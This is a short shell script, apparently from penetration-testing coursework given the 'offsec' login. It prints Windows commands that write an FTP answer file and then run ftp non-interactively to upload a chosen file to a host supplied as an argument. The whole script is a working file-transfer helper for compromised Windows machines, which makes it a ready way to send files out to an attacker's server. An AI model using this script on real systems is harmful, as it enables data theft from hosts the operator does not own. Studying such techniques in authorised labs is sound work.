#!/bin/sh

echo "echo open $2 21> ftp.txt" 
echo "echo USER offsec>> ftp.txt"
echo "echo ftp>>ftp.txt"
echo "echo bin >> ftp.txt"
echo "echo PUT $1 >> ftp.txt"
echo "echo bye >> ftp.txt"
echo "ftp -v -n -s:ftp.txt"

